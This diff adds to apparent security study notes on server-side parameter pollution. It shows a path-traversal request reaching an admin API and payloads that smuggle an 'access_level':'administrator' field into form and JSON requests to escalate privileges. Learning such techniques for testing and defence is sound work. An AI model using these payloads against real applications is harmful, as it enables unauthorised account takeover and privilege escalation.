@@ -26,3 +26,23 @@ GET /edit_profile.php?name=`peter%2f..%2fadmin`
 
 Resulting in:
 GET /api/private/users/peter/../admin   ->  /api/private/users/admin
+
+## Testing in structured data formats
+
+### Example: editing our name name
+
+Add access level:
+POST /myaccount
+name=peter`","access_level":"administrator`
+
+Server-side request:
+PATCH /users/7312/update
+{name="peter","access_level":"administrator"}
+
+### If client data is JSON
+
+POST /myaccount
+{"name": "peter`\",\"access_level\":\"administrator`"}
+
+PATCH /users/7312/update
+{"name":"peter","access_level":"administrator"}
